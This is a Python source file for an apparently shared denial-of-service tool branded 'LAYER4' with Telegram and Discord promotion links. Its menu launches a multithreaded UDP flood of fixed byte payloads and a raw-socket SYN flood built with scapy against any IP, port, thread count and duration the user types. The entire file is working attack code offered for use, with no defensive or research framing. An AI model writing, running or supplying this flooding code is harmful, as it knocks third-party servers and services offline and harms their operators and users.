import socket
import threading
import datetime
import threading
import time
import os
from scapy.all import IP, TCP, raw
import random

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
          {zoic}
                    ╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦                                                                                                          
                    ║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣                                                                                                          
                    ╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩  {clear}
                   github.com/cybermads
           {zoic}╔═══════════════════════════════════╗{clear}
           {zoic}║{clear}  {zoic}-{clear} tcp      {zoic}|{clear} TCP Flood           {zoic}║{clear}         
           {zoic}║{clear}  {zoic}-{clear} udp      {zoic}|{clear} UDP Flood           {zoic}║{clear}
           {zoic}╚═══════════════════════════════════╝{clear}

""")              
    
def layer4():
    while True:
        banner()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
                                        
        if select.startswith("udp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{zoic}:{clear} {zoic}udp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                input()
                continue

            _, ip, port, threads, duration = parts
            port = int(port)
            threads = int(threads)
            duration = int(duration)

            def udp(ip, port, until_datetime):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                target = (ip, port)
                while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                    for data in payloads:
                        try:
                            sock.sendto(data, target)
                        except:
                            pass
                sock.close()

            def th(ip, port, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
                for _ in range(threads):
                    t = threading.Thread(target=udp, args=(ip, port, until))
                    t.start()

            th(ip, port, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {zoic}╔══════════════════════════════════{clear}
     {zoic}║{clear} HOST{zoic}:{clear} {zoic}[{clear}{ip}{zoic}]{clear}                     
     {zoic}║{clear} PORT{zoic}:{clear} {zoic}[{clear}{port}{zoic}]{clear}                    
     {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                 
     {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                    
     {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("tcp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{zoic}:{clear} {zoic}tcp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                input()
                continue

            _, ip, port, threads, duration = parts
            port = int(port)
            threads = int(threads)
            duration = int(duration)

            def syn(ip, port, until_datetime):
                while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                        payloads = IP(dst=ip)/TCP(dport=port, flags="S", seq=random.randint(1000, 9000))
                        sock.sendto(raw(payloads), (ip, 0))
                        sock.close()
                    except:
                        pass

            def th(ip, port, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
                for _ in range(threads):
                    t = threading.Thread(target=syn, args=(ip, port, until))
                    t.start()

            th(ip, port, threads, duration)

            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {zoic}╔══════════════════════════════════{clear}
     {zoic}║{clear} HOST{zoic}:{clear} {zoic}[{clear}{ip}{zoic}]{clear}                       
     {zoic}║{clear} PORT{zoic}:{clear} {zoic}[{clear}{port}{zoic}]{clear}                    
     {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
     {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
     {zoic}╚══════════════════════════════════{clear}          
""")
            time.sleep(duration)

if __name__ == "__main__":
    layer4()


